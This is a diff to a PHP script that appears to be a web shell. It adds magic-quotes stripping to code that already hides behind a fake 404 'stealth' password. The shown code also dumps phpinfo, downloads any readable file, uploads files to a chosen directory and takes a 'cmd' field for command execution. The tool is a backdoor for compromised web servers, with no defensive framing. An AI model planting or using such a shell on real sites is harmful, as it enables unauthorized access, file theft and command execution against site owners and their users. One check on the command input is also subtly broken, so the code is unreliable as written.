@@ -1,14 +1,25 @@
 <?php
     error_reporting(E_ALL);
+    if(function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc()) {
+        function stripslashes_deep($value) {
+            return is_array($value) ? array_map("stripslashes_deep", $value) : stripslashes($value);
+        }
+        $_GET = stripslashes_deep($_GET);
+        $_POST = stripslashes_deep($_POST);
+        $_COOKIE = stripslashes_deep($_COOKIE);
+    }
+
     $stealth_password = "";
     if($stealth_password !== "" && (!isset($_GET["pw"]) || $_GET["pw"] !== $stealth_password)) {
         http_response_code(404);
         exit();
     }
+
     if(isset($_POST["submit-phpinfo"])) {
         phpinfo();
         exit();
     }
+
     if(isset($_POST["download-file"]) && trim($_POST["download-file"]) !== "") {
         $file = $_POST["download-file"];
         if(is_readable($file)) {
@@ -21,6 +32,7 @@
             $download_msg = "Error accessing file <code>" . htmlspecialchars($file) . "</code><br />\n";
         }
     }
+
     if(isset($_POST["submit-upload"])) {
         if(isset($_POST["upload-dir"]) && trim($_POST["upload-dir"]) !== "") {
             $upload_dir = $_POST["upload-dir"];
@@ -44,6 +56,7 @@
             }
         }
     }
+
     $execute = isset($_POST["cmd"]) && trim($_POST["cmd"] !== "");
 ?>
 <!DOCTYPE html>
